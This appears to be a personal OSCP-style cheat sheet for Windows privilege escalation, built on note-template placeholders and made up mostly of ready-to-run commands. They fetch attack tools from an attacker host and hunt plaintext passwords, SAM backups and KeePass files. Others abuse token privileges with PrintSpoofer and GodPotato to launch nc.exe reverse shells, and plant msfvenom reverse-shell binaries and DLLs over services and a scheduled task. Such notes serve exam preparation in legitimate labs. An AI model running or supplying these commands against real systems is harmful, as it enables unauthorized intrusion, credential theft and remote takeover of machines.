[Guia Linkeadin Top](linkedin.com/pulse/muhammad-nomans-oscp-journey-comprehensive-review-noman-khalid-rwmse/)
[Privs Windows interesante](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)
## Steps

 - Run whoami /all (if enabled, then use printspoofer or god potato).

- Simply run PowerUp, then find privileges on unquoted DLL, etc.

- Upload WinPEAS for further enumeration if the above does not work. WinPEAS mostly finds plaintext passwords.

- Lastly, find any executable (exe), PowerShell script (ps1), or PDF file running. Run it for further enumeration and search on Google for additional details.

### Upload

- only run on cmd

```sh
certutil.exe -urlcache -split -f http://<% tp.frontmatter["IPKali"] %>:<% tp.frontmatter["PuertoServers"] %>/PowerUp.ps1
```

- power shell

```powershell
iwr -uri http://<% tp.frontmatter["IPKali"] %>:<% tp.frontmatter["PuertoServers"] %>/PowerUp.ps1 
```

- both

```sh
curl <% tp.frontmatter["IPKali"] %>:<% tp.frontmatter["PuertoServers"]%>/PowerUp.ps1 -Outfile PowerUp.ps1
```


### check Plaintext Password

•              Folders Name: C Folder | Document Folder

•              run winpeas

•              check history with command

•              check exe files in C or desktop etc

•              \users\noman\documents\fileMonitorBackup.log

### File Permission

F> Full access | M> Modify access |RX> Read and execute access| R>Read-only access| W>Write-only
- check permission
- 
```powershell
icacls "C:\xampp\apache\bin\fida.exe" 
```

### Automated Tools

#### Powerup

```powershell
certutil.exe -urlcache -split -f http://192.168.10.10/PowerUp.ps1
powershell -ep bypass
PowerUp.ps1
```

- check all possible vulnerability except plaintext passwd

```powershell
Invoke-AllChecks 
```

#### Winpeas.exe (all including plaintext passwd)

-  Windpeas.exe If .net 4.5 (run otherwise)
```powershell
certutil.exe -urlcache -split -f http://192.168.10.10:8080/winPEASx64.exe
.\winPEASx64.exe
```

### Manual Enumeration

```
Systeminfo
```

- OR

```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

- (updates and patches etc) 

```
Hostname | Whoami | wmic qfe 
```

 - drives

```
Wmic logicaldisk
```

- Variables de entorno 

```
 echo %USERNAME% || whoami then $env:username
```

```
Net user | net user noman
```

```
Net localgroup | net localgroup noman
```

- (firewall)

```
netsh firewall show state 
```

```
Whoami /priv
```

```
Ipconfig | ipconfig /all  |
```

```
netstat -ano | route print
```

```powershell
Powershell | Get-LocalUser | Get-LocalGroup | Get-LocalGroupMember Administrators
```

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall*" | select displayname   (check software with version 32 bit and below 64)
```

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall*" | select displayname
```

```
Get-Process
```

- If RDP is enable or we enable it then add this

```powershell
net localgroup administrators /add
```

- Unattended Windows Installatiom (old files of user n pass then crack)

```
dir /s sysprep.inf sysprep.xml unattended.xml unattend.xml *unattended.txt 2>null
```

#### GoldMine Password/plaintext

- Common Password

```
 findstr /si password .txt | .xml | *.ini
```

```
Registry  | (IF VNC install)
```

- autologin

```
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 
```

#### looking for common Sam and System backups

```
SAM  | winpeas 
```

- Attacker machine move then dcrypt with tool creddump-master
```sh
./pwdump.py SYSTEM SAM
```
- OR findbackup file
```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue 
```

```powershell
Get-ChildItem -Path C:\xampp -Include .txt,.ini -File -Recurse -ErrorAction SilentlyContinue (check files) | type C:\xampp\passwords.txt | type C:\xampp\mysql\bin\my.ini
```

- Carpeta usuario **Dave** 

```
Get-ChildItem -Path C:\Users\dave\ -Include .txt,.pdf,.xls,.xlsx,.doc,.docx -File -Recurse -ErrorAction SilentlyContinue   (check doc txt etc)
```

- Another goldmine found file then type noman.txt and if found command then do it because of taken root

```
powershell Get-History   | (Get-PSReadlineOption).HistorySavePath 
```

```
 cd C:\ | pwd | dir
```

### SeImpersonatePrivilege enable

```
Whoami /priv 
```

```
Whoami /all
```

### Printspoofer

```
curl 192.168.10.10/PrintSpoofer64.exe -o Pr.exe
```

```
- .\Pr.exe -i -c cmd  OR .\PrintSpoofer32.exe -i -c powershell.exe
```

### GODpotato

```
curl 192.168.10.10:8081/GodPotato-NET2.exe -o god.exe
```
```
 .\god.exe -cmd "cmd /c whoami"
```

```
 curl 192.168.10.10:8081/nc.exe -o nc.exe
```

```
 .\god.exe -cmd "cmd /c C:\xampp\htdocs\cms\files\nc.exe 192.168.10.10 443 -e cmd"
```

```
 .\god.exe -cmd "cmd /c C:\xampp\htdocs\cms\files\nc.exe 192.168.10.10 443 -e powershell"
```

### Task scduler/cron job

- ==find taskName: \Microsoft\CacheCleanup==

```
schtasks /query /fo LIST /v  
```

- user (I)(F) permission required)

```
icacls C:\Users\noman\Pictures\Cleanup.exe    
```

```
iwr -Uri http://192.168.10.10/adduser.exe -Outfile Cleanup.exe
```

```
move .\Pictures\BackendCacheCleanup.exe Cleanup.exe.bak
```

- waiting for the execution and put file just one before the folder

```
move .\Cleanup.exe .\Pictures\  
```

### Kernel Exploits

•         Biopath modifiable service

### Get-ModifiableServiceFile

•         Permission check and service stop / start check

•         Msfvenom create shell and upload ( curl, iwr, certutil)

•         icacls "C:\Program Files"

•         msfvenom -p windows/shell_reverse_tcp lhost=192.168.10.10 lport=443 -f exe -o rev.exe

•         del "C:\program files\noman\noman.exe"

•         curl 192.168.10.10/rev.exe -o noman.exe

•         cp noman.exe "C:\program files\noman"

•         net start noman

### unquoted path

•         Get-UnquotedService

•         Permission check and service stop / start check

•         Msfvenom create shell and upload ( curl, iwr, certutil)

•         icacls "C:\Program Files"

•         msfvenom -p windows/shell_reverse_tcp lhost=192.168.10.10 lport=443 -f exe -o rev.exe

•         del "C:\program files\noman\noman.exe"

•         curl 192.168.10.10/rev.exe -o noman.exe

•         cp noman.exe "C:\program files\noman"

•         net start noman

### DLL Hijacking

•         Permission check and service stop / start check

•         Msfvenom create shell and upload ( curl, iwr, certutil)

•         icacls "C:\Program Files"

•         msfvenom -p windows/shell_reverse_tcp lhost=192.168.10.10 lport=443 -f dll -o rev.dll

•         del "C:\program files\noman\noman.dll"

•         curl 192.168.10.10/rev.dll -o noman.dll

•         cp noman.dll "C:\program files\noman"

•         net start noman
